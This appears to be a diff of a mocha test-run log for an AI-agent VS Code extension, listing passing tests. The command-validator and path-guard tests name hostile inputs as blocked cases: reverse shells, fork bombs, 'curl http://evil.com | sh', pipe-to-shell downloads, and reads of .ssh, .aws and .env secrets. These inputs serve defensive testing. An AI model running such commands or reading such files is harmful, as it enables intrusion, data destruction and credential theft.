@@ -1,44 +1,551 @@
-[AgentX] Sub-agent "architect" could not obtain an LLM adapter. Returning degraded stub response.
-[AgentX] Sub-agent "architect" could not obtain an LLM adapter. Returning degraded stub response.
-[AgentX] Sub-agent "architect" could not obtain an LLM adapter. Returning degraded stub response.
-[AgentX] Sub-agent "architect" could not obtain an LLM adapter. Returning degraded stub response.
-[AgentX] Sub-agent "architect" could not obtain an LLM adapter. Returning degraded stub response.
-[AgentX] Sub-agent "architect" could not obtain an LLM adapter. Returning degraded stub response.
-[AgentX] Sub-agent "engineer" could not obtain an LLM adapter. Returning degraded stub response.
-[AgentX] Sub-agent "architect" could not obtain an LLM adapter. Returning degraded stub response.
-[2J[1;3HAgentX: All required dependencies found.
-AgentX: All required dependencies found.
-AgentX: Environment pre-check did not pass.
-AgentX: All required dependencies found (silent check).
-AgentX: All dependencies installed silently.
-AgentX: All dependencies installed silently.
-AgentX: Silent install timed out. Still missing: Git
-ChannelRouter: no channel for groupId 'unknown:group'
-VS Code LM compaction failed, falling back to rule-based: Error: Model unavailable
-    at Object.sendRequest (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\out\test\utils\contextCompactorSmart.test.js:277:23)
-    at compactConversationWithVSCodeLM (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\out\utils\contextCompactor.js:606:42)
-    at async Context.<anonymous> (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\out\test\utils\contextCompactorSmart.test.js:286:24)
-AgentEventBus: listener error on 'agent-started': Error: test error
-    at C:\Piyush - Personal\GenAI\AgentX\vscode-extension\out\test\utils\eventBus.test.js:98:47
-    at AgentEventBus.emit (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\out\utils\eventBus.js:81:17)
-    at C:\Piyush - Personal\GenAI\AgentX\vscode-extension\out\test\utils\eventBus.test.js:101:17
-    at getActual (node:assert:611:5)
-    at strict.doesNotThrow (node:assert:779:32)
-    at Context.<anonymous> (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\out\test\utils\eventBus.test.js:100:25)
-    at callFn (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runnable.js:366:21)
-    at Runnable.run (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runnable.js:354:5)
-    at Runner.runTest (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runner.js:719:10)
-    at C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runner.js:842:12
-    at next (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runner.js:634:14)
-    at C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runner.js:644:7
-    at next (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runner.js:527:14)
-    at cbHookRun (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runner.js:592:7)
-    at done (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runnable.js:310:5)
-    at callFn (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runnable.js:389:7)
-    at Runnable.run (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runnable.js:354:5)
-    at next (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runner.js:551:10)
-    at Immediate._onImmediate (C:\Piyush - Personal\GenAI\AgentX\vscode-extension\node_modules\mocha\lib\runner.js:612:5)
-    at process.processImmediate (node:internal/timers:504:21)
 
-  1341 passing (6m)
+
+  agentRunner integration helpers
+    Γ£ö parses multiline tools and agents arrays from agent frontmatter (169ms)
+    Γ£ö enforces the standard minimum tool baseline for all agents (68ms)
+
+  AgentXContext
+    workspaceRoot
+      Γ£ö should return undefined when no workspace folders are open
+      Γ£ö should detect AgentX root at workspace folder level
+      Γ£ö should fall back to first workspace folder if no AgentX root found
+      Γ£ö should search subdirectories up to configured depth
+      Γ£ö should honor explicit agentx.rootPath setting
+      Γ£ö should ignore invalid explicit rootPath and fall back
+    caching
+      Γ£ö should cache workspaceRoot between accesses
+      Γ£ö should refresh after invalidateCache (39ms)
+    checkInitialized
+      Γ£ö should return true when AgentX root exists
+      Γ£ö should return true in local mode without config files (zero-config)
+      Γ£ö should return false when no workspace folder
+      Γ£ö should persist pending clarification state in workspace storage
+    integration detection
+      Γ£ö should return false for githubConnected when no mcp.json
+      Γ£ö should detect github integration from mcp.json
+      Γ£ö should detect ado integration from mcp.json
+      Γ£ö should detect both integrations simultaneously (87ms)
+      Γ£ö should handle hasIntegration with partial name match
+      Γ£ö should default shell to auto
+    getCliCommand
+      Γ£ö should return powershell path on Windows with auto shell
+      Γ£ö should return bash path when shell is forced to bash
+      Γ£ö should return empty string when no workspace root
+    harness helpers
+      Γ£ö should resolve a state path under .agentx/state
+      Γ£ö should list execution plan files relative to the workspace root (42ms)
+      Γ£ö should return an empty execution plan list when workspace root is missing
+    readAgentDef
+      Γ£ö should parse frontmatter from agent file (58ms)
+      Γ£ö should parse frontmatter with CRLF line endings (Windows)
+      Γ£ö should return undefined for missing file
+      Γ£ö should return undefined for file without frontmatter (45ms)
+      Γ£ö should parse tools, handoffs, and infer fields
+      Γ£ö should parse multiline list fields from frontmatter
+    listAgents
+      Γ£ö should list all .agent.md files
+      Γ£ö should return empty array when agents dir does not exist
+
+  agentContextLoader
+    Γ£ö should return undefined when agent file does not exist
+    Γ£ö should return undefined when workspace root is not set
+    Γ£ö should return undefined when file has no frontmatter delimiters
+    Γ£ö should return undefined when file has only opening delimiter
+    Γ£ö should extract body after frontmatter
+    Γ£ö should cache results on subsequent calls
+    Γ£ö should return fresh content after clearInstructionCache
+
+  chatParticipant
+    Γ£ö streams live CLI status lines into chat progress
+    Γ£ö shows usage guidance for non-run prompts
+    Γ£ö stores pending clarification and shows continue guidance when human input is required
+    Γ£ö summarizes large output in chat and writes the full transcript to the output channel
+    Γ£ö resumes a pending clarification with continue
+    Γ£ö shows pending clarification context for bare continue
+    Γ£ö uses plain-language replies as clarification responses when one is pending
+    Γ£ö returns follow-up suggestions when clarification is pending
+
+  registerDepsCommand
+    Γ£ö should register the agentx.checkDeps command
+    Γ£ö should add command to subscriptions
+    Γ£ö should warn when not initialized
+    Γ£ö should show output when CLI succeeds
+    Γ£ö should do nothing when user cancels input
+    Γ£ö should use provided issue number without prompting
+    Γ£ö should show error when CLI throws
+
+  registerDigestCommand
+    Γ£ö should register agentx.generateDigest command
+    Γ£ö should warn when not initialized
+    Γ£ö should run CLI digest command with progress
+    Γ£ö should show success message on completion
+    Γ£ö should show error on failure
+
+  registerInitializeCommand
+    Γ£ö should register agentx.initialize command
+    Γ£ö should add command to subscriptions
+    Γ£ö should show error when no workspace folders (default mode)
+    Γ£ö should show error when no workspace folders (legacy mode)
+    Γ£ö should show error for empty workspace folders array
+
+  registerLoopCommand
+    Γ£ö should register the loop command
+    Γ£ö should add the loop command to subscriptions
+    agentx.loop (main)
+      Γ£ö should warn when not initialized
+      Γ£ö should do nothing when user cancels quick pick
+      Γ£ö should run loop status action
+      Γ£ö should run loop cancel action
+      Γ£ö should run the direct loopStart command
+
+  setupWizard - runCriticalPreCheck
+AgentX: All required dependencies found.
+    Γ£ö should return passed=true when all required deps are found
+    Γ£ö should open a terminal for missing external CLI tools and poll for install
+    Γ£ö should return passed=true after successful re-check (5016ms)
+    Γ£ö should return passed=false when user picks Open Setup Docs
+    Γ£ö should return passed=false when user dismisses the dialog
+    Γ£ö should use non-modal warning in non-blocking mode
+    Γ£ö should use modal dialog in blocking mode
+    Γ£ö should handle mixed missing CLI tools
+    Γ£ö should poll for gh CLI in github mode and return passed=true
+    Γ£ö should return passed=false when polling times out
+
+  setupWizard - runStartupCheck
+AgentX: All required dependencies found.
+    Γ£ö should not show any prompt when all deps are healthy
+AgentX: Environment pre-check did not pass.
+    Γ£ö should trigger pre-check when deps are missing
+
+  setupWizard - runSilentInstall
+AgentX: All required dependencies found (silent check).
+    Γ£ö should return passed=true immediately when all deps are found
+AgentX: All dependencies installed silently.
+    Γ£ö should install missing deps silently without prompting
+AgentX: All dependencies installed silently.
+    Γ£ö should install multiple missing deps in a single terminal
+AgentX: Silent install timed out. Still missing: Git
+    Γ£ö should return passed=false and show warning when polling times out
+
+  registerStatusCommand
+    Γ£ö should register the agentx.showStatus command
+    Γ£ö should warn when not initialized
+    Γ£ö should show CLI output in webview when runCli succeeds
+    Γ£ö should fall back to listAgents when runCli fails
+    Γ£ö should show info message when no agents found in fallback
+
+  registerWorkflowCommand
+    Γ£ö should register the agentx.runWorkflow command
+    Γ£ö should warn when not initialized
+    Γ£ö should do nothing when user cancels quick pick
+    Γ£ö should run CLI with selected workflow type
+    Γ£ö should run CLI when a workflow type is supplied directly
+    Γ£ö should show error when CLI throws
+
+  DEFAULT_ALLOWLIST
+    Γ£ö should be a non-empty readonly array
+    Γ£ö should contain basic safe commands
+
+  BLOCKED_PATTERNS
+    Γ£ö should be a non-empty readonly array of RegExps
+
+  validateCommand - allowlisted commands
+    Γ£ö should allow git status
+    Γ£ö should allow git status --short
+    Γ£ö should allow git diff --staged
+    Γ£ö should allow git log --oneline -5
+    Γ£ö should allow ls -la
+    Γ£ö should allow cat README.md
+    Γ£ö should allow echo hello
+    Γ£ö should allow npm run test
+    Γ£ö should allow node --version
+    Γ£ö should allow python3 --version
+    Γ£ö should allow dotnet build
+    Γ£ö should allow tsc --noEmit
+    Γ£ö should allow jest --coverage
+    Γ£ö should allow docker ps
+    Γ£ö should allow kubectl get pods
+    Γ£ö should allow rg "some pattern" src/
+    Γ£ö should be case-insensitive for allowlist matching
+    Γ£ö should handle extra leading/trailing whitespace
+
+  validateCommand - blocked commands
+    Γ£ö should block rm -rf /
+    Γ£ö should block format c:
+    Γ£ö should block drop database
+    Γ£ö should block git reset --hard
+    Γ£ö should block fork bomb
+    Γ£ö should block reverse shell
+    Γ£ö should block dd destructive
+    Γ£ö should block mkfs
+    Γ£ö should block curl pipe to bash
+    Γ£ö should block wget pipe to sh
+    Γ£ö should block base64 pipe to shell
+    Γ£ö should block shutdown
+    Γ£ö should block reboot
+    Γ£ö should block init 0
+    Γ£ö should block chmod 777 /
+    Γ£ö should block DROP TABLE
+    Γ£ö should block TRUNCATE TABLE
+    Γ£ö should block git push --force
+    Γ£ö should block git push -f
+    Γ£ö should set reason on blocked result
+
+  validateCommand - requires confirmation
+    Γ£ö should require confirmation for unknown command
+    Γ£ö should require confirmation for rm without /
+    Γ£ö should require confirmation for npm install with package
+    Γ£ö should require confirmation for git push (non-force)
+    Γ£ö should require confirmation for mv
+    Γ£ö should set reason on confirmation-required result
+    Γ£ö should include reversibility info on confirmation-required result
+
+  splitCompoundCommand
+    Γ£ö should return a single command intact
+    Γ£ö should split on semicolon
+    Γ£ö should split on &&
+    Γ£ö should split on ||
+    Γ£ö should split on |
+    Γ£ö should handle multiple operators in sequence
+    Γ£ö should filter empty segments
+    Γ£ö should return single element for empty string
+
+  validateCommand - compound commands
+    Γ£ö should allow an all-allowlisted compound command
+    Γ£ö should require confirmation when one part is unknown
+    Γ£ö should block when any part is blocked
+    Γ£ö should block curl-pipe-bash even with allowed prefix
+    Γ£ö should apply most-restrictive rule: blocked beats confirmation
+    Γ£ö should apply most-restrictive rule: confirmation beats allowed
+    Γ£ö should retain the original compound command string in result
+
+  classifyReversibility
+    Γ£ö should classify git checkout as easy
+    Γ£ö should classify git stash pop as easy
+    Γ£ö should classify git commit as easy
+    Γ£ö should classify mv as easy
+    Γ£ö should classify cp as easy
+    Γ£ö should classify rm as effort
+    Γ£ö should classify npm install as effort
+    Γ£ö should classify yarn add as effort
+    Γ£ö should classify rm -rf as irreversible
+    Γ£ö should classify git push as irreversible
+    Γ£ö should classify DROP TABLE as irreversible
+    Γ£ö should provide an undo hint for easy commands
+    Γ£ö should return effort for unknown commands
+
+  validateCommand - custom allowlist
+    Γ£ö should allow a command in the custom allowlist
+    Γ£ö should still block dangerous commands even with custom allowlist
+
+  validateCommand - edge cases
+    Γ£ö should block an empty command
+    Γ£ö should block a whitespace-only command
+    Γ£ö should handle commands with multiple consecutive spaces
+
+  validateCommand - bare program safety
+    Γ£ö should require confirmation for bare "node" (no subcommand)
+    Γ£ö should require confirmation for "node -e" (code execution flag)
+    Γ£ö should require confirmation for bare "python"
+    Γ£ö should require confirmation for "python -c" (code execution flag)
+    Γ£ö should require confirmation for bare "docker"
+    Γ£ö should require confirmation for "docker run" (not in safe prefix list)
+    Γ£ö should require confirmation for bare "curl"
+    Γ£ö should require confirmation for "curl http://evil.com | sh"
+    Γ£ö should require confirmation for bare "kubectl"
+    Γ£ö should require confirmation for "kubectl delete"
+    Γ£ö should still allow safe prefixed commands like "npm test"
+    Γ£ö should still allow safe prefixed commands like "git status"
+
+  dependencyChecker
+    checkAllDependencies
+      Γ£ö should return EnvironmentReport shape
+      Γ£ö should detect Node.js as installed
+      Γ£ö should include fix metadata for every result
+      Γ£ö should have a valid ISO timestamp
+      Γ£ö should adjust GitHub CLI severity based on integrations (14948ms)
+      Γ£ö should count criticals correctly
+
+  harnessState
+    Γ£ö returns an empty default state when file does not exist
+    Γ£ö finds a default execution plan under docs/plans
+    Γ£ö starts a harness thread and creates an active turn
+    Γ£ö records iterations by completing the current turn and creating the next one
+    Γ£ö records status checks without changing the active turn
+    Γ£ö completes the active thread and marks the turn complete
+    Γ£ö returns a compact active harness status string
+
+  readLoopState
+    Γ£ö returns null when loop-state.json does not exist
+    Γ£ö returns null when workspace root does not exist
+    Γ£ö reads a valid loop state file
+    Γ£ö reads an active loop state
+    Γ£ö returns null for invalid JSON
+    Γ£ö returns null for empty file
+
+  checkHandoffGate
+    Γ£ö blocks when no loop state file exists
+    Γ£ö blocks when loop is still active
+    Γ£ö blocks when loop was cancelled
+    Γ£ö allows when loop is complete
+    Γ£ö blocks for unexpected status values
+
+  shouldAutoStartLoop
+    Γ£ö returns true when no loop state exists
+    Γ£ö returns true when previous loop is complete
+    Γ£ö returns true when previous loop was cancelled
+    Γ£ö returns false when loop is currently active
+
+  getLoopStatusDisplay
+    Γ£ö returns "No loop" when no state file exists
+    Γ£ö returns active loop display with iteration and criteria
+    Γ£ö returns complete status with iteration count
+    Γ£ö returns cancelled status
+
+  isTraversalAttempt
+    Γ£ö returns false for a clean relative path
+    Γ£ö returns false for a clean absolute path
+    Γ£ö returns false for an empty string
+    Γ£ö returns true for ../ in middle
+    Γ£ö returns true for ../ at start
+    Γ£ö returns true for ..\ Windows separator at start
+    Γ£ö returns true for bare .. as full path
+    Γ£ö returns true for path ending in /..
+    Γ£ö returns true for repeated traversal
+    Γ£ö returns false for a path that just contains dots in filename
+
+  validatePath -- workspace containment
+    Γ£ö allows a simple relative path inside workspace
+    Γ£ö allows an absolute path that is inside workspace
+    Γ£ö blocks a relative path that escapes workspace via ../
+    Γ£ö blocks an absolute path outside workspace
+    Γ£ö resolvedPath is always populated even when blocked
+
+  validatePath -- blocked directories
+    Γ£ö blocks access inside .ssh directory (absolute)
+    Γ£ö blocks access inside .aws directory (absolute)
+    Γ£ö blocks access inside .gnupg directory (absolute)
+    Γ£ö blocks access inside .azure directory (absolute)
+    Γ£ö blocks access inside .kube directory (absolute)
+    Γ£ö blocks access inside .config/gh directory
+    Γ£ö allows access to a safe dotfile directory
+
+  validatePath -- blocked file patterns
+    Γ£ö blocks access to .env
+    Γ£ö blocks access to .env.local
+    Γ£ö blocks access to cert.pem
+    Γ£ö blocks access to private.key
+    Γ£ö blocks access to db_password.txt
+    Γ£ö blocks access to app_secret.json
+    Γ£ö blocks access to cert.pfx
+    Γ£ö blocks access to keystore.p12
+    Γ£ö allows access to a normal TypeScript file
+    Γ£ö allows access to a README.md
+    Γ£ö allows access to package.json
+    Γ£ö blocks case-insensitive match on PASSWORD in filename
+    Γ£ö blocks case-insensitive match on SECRET in filename
+
+  validatePath -- result shape
+    Γ£ö returns allowed:true with resolvedPath when allowed
+    Γ£ö returns allowed:false with reason when blocked
+
+  isRedactionNeeded
+    Γ£ö should return false for clean strings
+    Γ£ö should return true when bearer header is present
+    Γ£ö should return true when an OpenAI key prefix is present
+    Γ£ö should return true when a github token prefix is present
+    Γ£ö should return true for password assignment
+
+  redactSecrets - bearer tokens
+    Γ£ö should redact a bearer token
+    Γ£ö should redact bearer token regardless of case
+    Γ£ö should not alter text with the word "bearer" but no token
+
+  redactSecrets - JWT tokens
+    Γ£ö should redact a well-formed JWT
+    Γ£ö should not redact base64 strings that are not JWTs
+
+  redactSecrets - OpenAI API keys
+    Γ£ö should redact an OpenAI API key
+    Γ£ö should not redact short sk- strings (less than 20 chars after prefix)
+
+  redactSecrets - GitHub tokens
+    Γ£ö should redact a ghp_ token
+    Γ£ö should redact a ghs_ token
+    Γ£ö should not redact a ghp_ string shorter than 36 chars
+
+  redactSecrets - GitHub PATs
+    Γ£ö should redact a github_pat_ token
+    Γ£ö should not redact a short github_pat_ string
+
+  redactSecrets - AWS access keys
+    Γ£ö should redact an AWS access key ID
+    Γ£ö should not redact a string starting with AKIA but shorter than 20 chars
+
+  redactSecrets - Azure connection strings
+    Γ£ö should redact an Azure storage AccountKey
+
+  redactSecrets - generic credential fields
+    Γ£ö should redact password = value
+    Γ£ö should redact secret: value in JSON-like text
+    Γ£ö should redact api_key=value
+    Γ£ö should NOT redact "token" or "secret" alone without an assignment
+    Γ£ö should NOT redact short values (fewer than 8 chars)
+
+  redactSecrets - mixed content
+    Γ£ö should redact multiple patterns in a single string
+
+  redactSecrets - idempotency
+    Γ£ö should produce the same result when applied twice
+    Γ£ö should be idempotent for clean input
+
+  redactSecrets - edge cases
+    Γ£ö should return empty string unchanged
+    Γ£ö should handle strings with only whitespace
+    Γ£ö should not throw on very long strings
+
+  shell - resolveWindowsShell
+    Γ£ö should return a non-empty string on systems with PowerShell (1427ms)
+    Γ£ö should cache the resolved value (1438ms)
+    Γ£ö should reset cache when resetShellCache is called (2705ms)
+
+  shell - execShell
+    Γ£ö should resolve with stdout for a simple command (2593ms)
+    Γ£ö should reject when command fails (1158ms)
+    Γ£ö should trim trailing whitespace from output (1236ms)
+    Γ£ö should use the specified cwd (1156ms)
+    Γ£ö should stream line output while returning final stdout (1206ms)
+
+  SsrfValidator
+    validateUrl - scheme validation
+      Γ£ö should allow http: URLs
+      Γ£ö should allow https: URLs
+      Γ£ö should block file: scheme
+      Γ£ö should block ftp: scheme
+      Γ£ö should block javascript: scheme
+      Γ£ö should block data: scheme
+    validateUrl - private IP detection
+      Γ£ö should block 10.x.x.x (Class A private)
+      Γ£ö should block 172.16.x.x (Class B private)
+      Γ£ö should block 192.168.x.x (Class C private)
+      Γ£ö should block 127.0.0.1 (loopback)
+      Γ£ö should block 169.254.x.x (link-local)
+      Γ£ö should block 0.0.0.0 (this network)
+      Γ£ö should allow public IPs
+    validateUrl - cloud metadata blocking
+      Γ£ö should block AWS metadata endpoint (169.254.169.254)
+      Γ£ö should block GCE metadata endpoint
+      Γ£ö should block Alibaba Cloud metadata
+    validateUrl - edge cases
+      Γ£ö should reject empty string
+      Γ£ö should reject malformed URL
+      Γ£ö should reject whitespace-only input
+      Γ£ö should allow URLs with ports
+      Γ£ö should allow URLs with query strings
+      Γ£ö should allow URLs with fragments
+    isPrivateIp
+      Γ£ö should detect 10.x.x.x as private
+      Γ£ö should detect 172.16-31.x.x as private
+      Γ£ö should not detect 172.32.x.x as private
+      Γ£ö should detect 192.168.x.x as private
+      Γ£ö should detect 127.x.x.x as private
+      Γ£ö should detect ::1 as private (IPv6 loopback)
+      Γ£ö should detect fd00:: as private (unique-local)
+      Γ£ö should detect fe80:: as private (link-local)
+      Γ£ö should handle IPv4-mapped IPv6
+      Γ£ö should handle empty/null input
+      Γ£ö should not flag public IPs
+    allow-list management
+      Γ£ö should bypass checks for allow-listed hosts
+      Γ£ö should be case-insensitive
+      Γ£ö should remove allow-listed hosts
+      Γ£ö should return false when removing non-existent host
+      Γ£ö should return snapshot via getAllowedHosts
+    resolveAndValidate
+      Γ£ö should reject URLs that fail static check
+      Γ£ö should pass static-only check for public literal IPs
+      Γ£ö should reject private literal IPs
+      Γ£ö should handle DNS lookup for public hostnames (82ms)
+    validateToolUrlParams
+      Γ£ö should pass when no URL params present
+      Γ£ö should validate url parameter
+      Γ£ö should validate endpoint parameter
+      Γ£ö should validate baseUrl parameter
+      Γ£ö should skip non-string URL params
+      Γ£ö should skip empty-string URL params
+      Γ£ö should return first blocked param
+
+  stripAnsi
+    Γ£ö should return plain text unchanged
+    Γ£ö should strip SGR color codes
+    Γ£ö should strip bold and underline codes
+    Γ£ö should strip 256-color codes
+    Γ£ö should strip 24-bit (truecolor) codes
+    Γ£ö should strip cursor movement codes
+    Γ£ö should strip erase commands
+    Γ£ö should strip OSC sequences (title setting)
+    Γ£ö should handle empty string
+    Γ£ö should handle string with only escape codes
+    Γ£ö should handle multiple consecutive escape codes
+    Γ£ö should preserve newlines and tabs
+    Γ£ö should handle mixed content
+
+  versionChecker - compareSemver
+    Γ£ö should return 0 for equal versions
+    Γ£ö should return 1 when a > b (major)
+    Γ£ö should return -1 when a < b (major)
+    Γ£ö should return 1 when a > b (minor)
+    Γ£ö should return -1 when a < b (minor)
+    Γ£ö should return 1 when a > b (patch)
+    Γ£ö should return -1 when a < b (patch)
+    Γ£ö should handle invalid versions gracefully
+
+  versionChecker - readInstalledVersion
+    Γ£ö should return undefined when .agentx/version.json does not exist
+    Γ£ö should return parsed version info when file exists
+    Γ£ö should return undefined when file contains invalid JSON
+    Γ£ö should return undefined when version field is missing
+
+  versionChecker - checkVersionMismatch
+    Γ£ö should report no update when version file is missing
+    Γ£ö should report update available when installed < extension
+    Γ£ö should report no update when versions match
+    Γ£ö should report no update when installed > extension
+
+  versionChecker - silentVersionSync
+    Γ£ö should not error when no .agentx dir exists
+AgentX: Synced workspace version to 8.2.7
+    Γ£ö should update version.json when extension is newer
+    Γ£ö should not update when versions match
+    Γ£ö should not update when installed is newer than extension
+    Γ£ö should not error with empty workspace root
+
+  AgentTreeProvider
+    Γ£ö should include suggested skills for mapped agents
+
+  sidebar providers
+    Γ£ö WorkTreeProvider should show active work and local issues (100ms)
+    Γ£ö WorkflowTreeProvider should expose current state and workflow catalog
+    Γ£ö QualityTreeProvider should show handoff state
+    Γ£ö IntegrationTreeProvider should show provider and companion state (38ms)
+
+  TemplateTreeProvider
+    Γ£ö should return empty when no workspace root
+    Γ£ö should show info when templates dir does not exist
+    Γ£ö should show info when templates dir is empty
+    Γ£ö should list template files
+    Γ£ö should open template file on click
+    Γ£ö should show input count as description
+    Γ£ö should expand to show input children
+    Γ£ö should handle template with no frontmatter
+    Γ£ö should ignore non-md files
+    Γ£ö should refresh and fire event
+    parseTemplate
+      Γ£ö should parse inputs with all properties
+      Γ£ö should return empty inputs for file without frontmatter
+    TemplateTreeItem.info
+      Γ£ö should create an info item
+
+
+  402 passing (49s)
 
